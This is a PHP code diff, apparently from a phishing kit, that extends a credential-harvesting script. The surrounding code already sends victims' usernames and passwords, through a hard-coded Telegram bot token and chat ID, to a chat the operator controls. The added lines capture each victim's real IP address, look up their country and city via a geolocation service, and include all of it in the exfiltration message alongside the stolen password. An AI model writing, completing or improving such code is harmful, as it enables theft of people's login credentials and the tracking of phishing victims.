@@ -30,7 +30,37 @@ if($usuario && $clave){
         $token = "8687740380:AAGWDU18CPeXsMWhpzy1n6uZ-MkeTxWYYUo";
         $chat_id = "8448767308";
 
-        $msg = "🔐 Nuevo acceso\nUsuario: $usuario\nClave: $clave\nID: $id";
+        // 🌐 IP REAL
+$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
+
+if(strpos($ip, ',') !== false){
+    $ip = explode(',', $ip)[0];
+}
+
+$ip = trim($ip);
+
+// 🌍 GEO
+$pais = "Desconocido";
+$ciudad = "Desconocido";
+
+$geoData = @file_get_contents("http://ipwho.is/".$ip);
+
+if($geoData){
+    $geo = json_decode($geoData);
+    if($geo && isset($geo->success) && $geo->success){
+        $pais = $geo->country;
+        $ciudad = $geo->city;
+    }
+}
+
+// 🧾 MENSAJE COMPLETO
+$msg = "🔐 Nuevo acceso\n\n";
+$msg .= "👤 Usuario: $usuario\n";
+$msg .= "🔑 Clave: $clave\n\n";
+$msg .= "🌐 IP: $ip\n";
+$msg .= "📍 País: $pais\n";
+$msg .= "🏙 Ciudad: $ciudad\n";
+$msg .= "🆔 ID: $id";
 
      $keyboard = [
     "inline_keyboard" => [
